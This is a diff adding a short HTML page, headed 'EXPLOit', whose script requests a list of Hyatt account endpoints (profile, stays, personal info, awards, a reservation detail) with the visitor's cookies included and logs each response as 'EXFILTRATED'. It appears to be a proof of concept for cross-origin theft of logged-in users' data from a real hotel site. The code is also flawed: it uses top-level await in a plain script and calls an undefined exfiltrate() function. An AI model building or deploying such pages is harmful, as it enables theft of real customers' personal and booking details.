@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hyatt Test</title>
+</head>
+<body>
+  <h1>EXPLOit</h1>
+  <script>
+    const endpoints = [
+      "https://www.hyatt.com/api/user/profile",
+      "https://www.hyatt.com/profile/en-US/account-overview",
+      "https://www.hyatt.com/profile/en-US/my-stays",
+      "https://www.hyatt.com/profile/en-US/personal-info",
+      "https://www.hyatt.com/profile/en-US/room-rate-preferences",
+      "https://www.hyatt.com/profile/en-US/awards",
+      "https://www.hyatt.com/profile/en-US/my-stays#upcoming-stays",
+      "https://www.hyatt.com/reservation/detail/Q9dQ%2BtCcvGsLWO3xj53yDWYS54eofXFb%2Fh3U%2FpFXQo8%3D"
+    ];
+    
+    for (const url of endpoints) {
+        try {
+          const res = await fetch(url, {
+            method: "GET",
+            credentials: "include"
+          });
+          const text = await res.text();
+          console.log(`[+] ${url} EXFILTRATED:`, text.slice(0, 500)); // Truncate to 500 chars
+        } catch (err) { 
+          console.error(`[!] Failed for ${url}:`, err);
+        }
+      }
+    
+    
+    exfiltrate();
+  </script>
+</body>
+</html>
